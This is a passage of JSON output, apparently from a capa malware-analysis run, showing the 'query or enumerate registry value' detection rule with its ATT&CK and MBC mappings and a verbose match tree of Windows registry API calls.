          "scopes": {
            "static": "function",
            "dynamic": "span of calls"
          },
          "attack": [
            {
              "parts": [
                "Discovery",
                "Query Registry"
              ],
              "tactic": "Discovery",
              "technique": "Query Registry",
              "subtechnique": "",
              "id": "T1012"
            }
          ],
          "mbc": [
            {
              "parts": [
                "Operating System",
                "Registry",
                "Query Registry Value"
              ],
              "objective": "Operating System",
              "behavior": "Registry",
              "method": "Query Registry Value",
              "id": "C0036.006"
            }
          ],
          "references": [],
          "examples": [
            "BFB9B5391A13D0AFD787E87AB90F14F5:0x13145B5A",
            "Practical Malware Analysis Lab 03-02.dll_:0x100047AD"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: query or enumerate registry value\r\n    namespace: host-interaction/registry\r\n    authors:\r\n      - william.ballenthin@mandiant.com\r\n      - michael.hunhoff@mandiant.com\r\n      - anushka.virgaonkar@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: span of calls\r\n    att&ck:\r\n      - Discovery::Query Registry [T1012]\r\n    mbc:\r\n      - Operating System::Registry::Query Registry Value [C0036.006]\r\n    examples:\r\n      - BFB9B5391A13D0AFD787E87AB90F14F5:0x13145B5A\r\n      - Practical Malware Analysis Lab 03-02.dll_:0x100047AD\r\n  features:\r\n    - and:\r\n      - optional:\r\n        - match: create or open registry key\r\n      - or:\r\n        - api: advapi32.RegGetValue\r\n        - api: advapi32.RegEnumValue\r\n        - api: advapi32.RegQueryValue\r\n        - api: advapi32.RegQueryValueEx\r\n        - api: advapi32.RegQueryMultipleValues\r\n        - api: ZwQueryValueKey\r\n        - api: ZwEnumerateValueKey\r\n        - api: NtQueryValueKey\r\n        - api: NtEnumerateValueKey\r\n        - api: RtlQueryRegistryValues\r\n        - api: SHGetValue\r\n        - api: SHEnumValue\r\n        - api: SHRegGetInt\r\n        - api: SHRegGetPath\r\n        - api: SHRegGetValue\r\n        - api: SHQueryValueEx\r\n        - api: SHRegGetUSValue\r\n        - api: SHOpenRegStream\r\n        - api: SHRegEnumUSValue\r\n        - api: SHOpenRegStream2\r\n        - api: SHRegQueryUSValue\r\n        - api: SHRegGetBoolUSValue\r\n        - api: SHRegGetValueFromHKCUHKLM\r\n        - api: SHRegGetBoolValueFromHKCUHKLM\r\n        - api: Microsoft.Win32.RegistryKey::GetValue\r\n        - api: Microsoft.Win32.RegistryKey::GetValueKind\r\n        - api: Microsoft.Win32.RegistryKey::GetValueNames\r\n        - api: Microsoft.Win32.Registry::GetValue\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651776352
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "optional"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "match",
                          "match": "create or open registry key"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "or"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenKeyEx"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651776416
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegCreateKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegCreateKeyEx"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenCurrentUser"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenUserClassesRoot"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegCreateKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKeyEx"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwCreateKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKeyTransactedEx"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwCreateKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "NtOpenKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "NtCreateKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "SHRegOpenUSKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "SHRegCreateUSKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RtlCreateRegistryKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::OpenSubKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::OpenBaseKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::OpenRemoteBaseKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::CreateSubKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "or"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenKeyEx"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651776614
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegCreateKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegCreateKeyEx"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenCurrentUser"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenUserClassesRoot"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegCreateKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKeyEx"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwCreateKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKeyTransactedEx"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwCreateKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "NtOpenKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "NtCreateKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "SHRegOpenUSKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "SHRegCreateUSKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RtlCreateRegistryKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::OpenSubKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::OpenBaseKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::OpenRemoteBaseKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::CreateSubKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651776352
                        },
                        {
                          "type": "absolute",
                          "value": 1651776582
                        }
                      ],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "RegGetValue"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "RegEnumValue"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "RegQueryValue"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "RegQueryValueEx"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651776659
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "RegQueryMultipleValues"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "ZwQueryValueKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "ZwEnumerateValueKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "NtQueryValueKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "NtEnumerateValueKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "RtlQueryRegistryValues"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHGetValue"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHEnumValue"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHRegGetInt"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHRegGetPath"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHRegGetValue"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHQueryValueEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHRegGetUSValue"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHOpenRegStream"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHRegEnumUSValue"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHOpenRegStream2"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHRegQueryUSValue"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHRegGetBoolUSValue"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHRegGetValueFromHKCUHKLM"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHRegGetBoolValueFromHKCUHKLM"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "Microsoft.Win32.RegistryKey::GetValue"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "Microsoft.Win32.RegistryKey::GetValueKind"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "Microsoft.Win32.RegistryKey::GetValueNames"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "Microsoft.Win32.Registry::GetValue"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651780816
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "optional"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "match",
                          "match": "create or open registry key"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "or"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenKeyEx"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651780938
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegCreateKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegCreateKeyEx"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenCurrentUser"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenUserClassesRoot"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegCreateKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKeyEx"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwCreateKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKeyTransactedEx"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwCreateKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "NtOpenKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "NtCreateKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "SHRegOpenUSKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "SHRegCreateUSKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RtlCreateRegistryKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::OpenSubKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::OpenBaseKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::OpenRemoteBaseKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::CreateSubKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "or"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenKeyEx"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651781495
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegCreateKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegCreateKeyEx"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenCurrentUser"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenUserClassesRoot"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegCreateKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKeyEx"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwCreateKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKeyTransactedEx"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwCreateKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "NtOpenKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "NtCreateKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "SHRegOpenUSKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "SHRegCreateUSKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RtlCreateRegistryKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::OpenSubKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::OpenBaseKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
